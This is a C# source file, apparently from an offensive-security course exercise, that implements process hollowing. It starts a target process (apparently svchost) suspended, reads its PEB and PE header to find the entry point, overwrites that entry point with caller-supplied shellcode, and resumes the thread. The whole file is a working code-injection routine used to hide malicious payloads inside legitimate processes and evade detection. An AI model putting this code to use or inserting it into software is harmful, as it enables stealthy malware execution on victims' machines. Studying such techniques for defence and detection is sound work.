using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using static _008._4._2_Process_Hollowing.Entry;

namespace _008._4._2_Process_Hollowing
{
    public partial class CreateHollowProcess
    {
        private string _procPath;
        private byte[] _shellcode;

        public CreateHollowProcess(string process, byte[] shellcode)
        {
            _procPath = process;
            _shellcode = shellcode;
        }

        public void StartProcess()
        {

            //Instantiate required structs.
            STARTUPINFO procStartupInfo = new STARTUPINFO();
            PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
            PROCESS_BASIC_INFORMATION procBasicInfo = new PROCESS_BASIC_INFORMATION();


            //0x4 creates the process in a suspended state.
            bool res = CreateProcess(null, _procPath, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref procStartupInfo, out procInfo);




            //Get pointer to image base newly created process.
            uint tmp = 0;
            IntPtr hProcess = procInfo.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref procBasicInfo, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)procBasicInfo.PebAddress + 0x10);


            //Get actual value of base address
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));



            //Read enough data to get PE header
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);




            //Get PE header Offset
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);

            //Get Optional header offset PE + 0x28
            uint opthdr = e_lfanew_offset + 0x28;

            //Get Relative Virtual Address
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            //Calculate EP Pointer. BaseAdress + RVA
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);




            //Hollow the process. i.e write our shellcode to the Entry Point.
            WriteProcessMemory(hProcess, addressOfEntryPoint, _shellcode, _shellcode.Length, out nRead);


            //Allow the process to run.
            ResumeThread(procInfo.hThread);
        }
    }
}
